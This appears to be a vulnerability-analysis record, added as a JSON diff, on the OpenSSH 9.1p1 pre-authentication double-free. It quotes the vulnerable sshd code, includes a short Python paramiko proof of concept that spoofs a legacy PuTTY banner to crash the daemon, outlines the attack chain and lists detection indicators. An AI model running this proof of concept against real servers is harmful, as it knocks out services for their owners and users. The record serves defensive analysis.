@@ -1,0 +1,151 @@
+{
+  "package_info": {
+    "package_name": "OpenSSH",
+    "package_manager": "source (Linux/Unix package managers, e.g., apt/yum/homebrew)",
+    "package_versions": "9.1p1 (prior to 9.2p1)",
+    "why_malicious": "The package contains a double-free vulnerability in its SSH daemon (sshd) that can be triggered pre-authentication, allowing remote attackers to crash worker processes (DoS) or, in the absence of memory protections, potentially achieve remote code execution (RCE)."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "pre-authentication (during SSH key exchange negotiation)",
+        "file_location": "compat_kex_proposal() in OpenSSH source code",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "if ((ssh->compat & SSH_OLD_DHGEX) != 0) {\n    cp = p;\n    if ((p = match_filter_denylist(p, \"diffie-hellman-group-exchange-sha256, diffie-hellman-group-exchange-sha1\")) == NULL)\n        fatal(\"match_filter_denylist failed\");\n    free(cp);\n}",
+      "code_language": "C",
+      "code_behavior": "During pre-authentication, the code frees a pointer (cp) that may still be referenced elsewhere, leading to a double-free when the same memory is later freed again, resulting in memory corruption and process crash.",
+      "malice_analysis": {
+        "why_suspicious": "Double-free vulnerabilities are a classic memory corruption issue that can be exploited for denial of service or, in some cases, remote code execution.",
+        "violated_expectations": "Normal behavior would ensure that memory is only freed once and that pointers are not reused after being freed. Here, the same pointer is freed twice due to logic error.",
+        "similar_legitimate_use": "Legitimate code may free memory, but only after ensuring it is not referenced elsewhere and not freed again.",
+        "key_indicators": [
+          "Freeing the same pointer twice (double-free)",
+          "Dangling pointer usage after free",
+          "Memory corruption potential in security-critical code"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "pre-authentication (client banner parsing)",
+        "file_location": "compat_banner() in OpenSSH source code",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "{ \"PuTTY_Release_0.64*\", SSH_OLD_DHGEX },",
+      "code_language": "C",
+      "code_behavior": "During pre-authentication, the code sets a compatibility flag (SSH_OLD_DHGEX) for certain client banners, which triggers the vulnerable code path in compat_kex_proposal().",
+      "malice_analysis": {
+        "why_suspicious": "The use of client banner parsing to set internal flags that alter memory management logic is risky, especially when it enables a vulnerable code path.",
+        "violated_expectations": "Normal behavior would not allow remote client input to influence memory management in a way that could cause double-free.",
+        "similar_legitimate_use": "Compatibility flags are often set for legacy clients, but should not introduce unsafe memory operations.",
+        "key_indicators": [
+          "Remote client input triggers unsafe code path",
+          "Legacy compatibility flag enables vulnerability"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "pre-authentication (key exchange algorithm assembly)",
+        "file_location": "kex_assemble_names() in OpenSSH source code",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "int kex_assemble_names(char **listp, const char *def, const char *all) { ... free(*listp); ... }",
+      "code_language": "C",
+      "code_behavior": "During pre-authentication, the function attempts to free a pointer (listp) that may have already been freed in compat_kex_proposal(), resulting in a double-free and memory corruption.",
+      "malice_analysis": {
+        "why_suspicious": "This is the second free operation on the same pointer, which is a direct result of the earlier logic error.",
+        "violated_expectations": "Memory should only be freed once; freeing an already-freed pointer is a critical error.",
+        "similar_legitimate_use": "Legitimate code would track ownership and ensure single free per allocation.",
+        "key_indicators": [
+          "Second free of the same pointer",
+          "Memory management error in security-sensitive context"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "pre-authentication (exploit PoC using paramiko)",
+        "file_location": "Python PoC script",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "import paramiko\n\nVICTIM_IP = \"127.0.1\"\nCLIENT_ID = \"PuTTY_Release_0.64\"\n\ndef main():\n    transport = paramiko.Transport(VICTIM_IP)\n    transport.local_version = f\"SSH-2.0-{CLIENT_ID}\"\n    transport.connect(username='', password='')\n\nif __name__ == \"__main__\":\n    main()",
+      "code_language": "python",
+      "code_behavior": "At connection time, the script forges a client banner to trigger the SSH_OLD_DHGEX code path, causing the vulnerable server to crash (DoS) by exploiting the double-free.",
+      "malice_analysis": {
+        "why_suspicious": "This code is designed to intentionally trigger the vulnerability for denial of service.",
+        "violated_expectations": "Normal SSH clients do not spoof legacy banners to exploit server vulnerabilities.",
+        "similar_legitimate_use": "Security researchers may use similar code for testing, but attackers can use it for DoS.",
+        "key_indicators": [
+          "Spoofed client banner",
+          "Automated triggering of known vulnerability"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker connects to OpenSSH server using a client with a legacy banner (e.g., PuTTY_Release_0.64) to trigger compatibility flag.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_4"
+      ],
+      "leads_to": "Vulnerable code path is enabled in the server."
+    },
+    {
+      "step": 2,
+      "action": "Server processes key exchange proposal and enters compat_kex_proposal() with SSH_OLD_DHGEX set.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "First free of options.kex_algorithms pointer."
+    },
+    {
+      "step": 3,
+      "action": "Server later calls kex_assemble_names(), which frees the same pointer again.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Double-free occurs, causing memory corruption."
+    },
+    {
+      "step": 4,
+      "action": "Depending on system protections, this results in a crash (DoS) or, in rare cases, remote code execution.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Denial of service or potential RCE."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Pre-authentication crash of sshd worker process",
+      "Multiple SSH connection attempts with legacy client banners (e.g., PuTTY_Release_0.64, WinSCP_release_5.7.4)",
+      "Abnormal memory management errors (double-free) in sshd logs"
+    ],
+    "file_indicators": [
+      "/etc/ssh/sshd_config with legacy KexAlgorithms or HostKeyAlgorithms enabled (for reproduction)",
+      "sshd core dumps or crash logs"
+    ],
+    "network_indicators": [
+      "SSH connections with client banners: PuTTY_Release_0.64, WinSCP_release_5.7.4, FuTTY*",
+      "Frequent failed SSH handshakes from the same source"
+    ],
+    "how_to_detect": "Monitor sshd logs for pre-authentication crashes or sandbox violations. Look for repeated SSH connections with legacy client banners. Use memory analysis tools to detect double-free or heap corruption in sshd processes. Network monitoring can flag suspicious SSH client banners associated with known exploit attempts."
+  }
+}
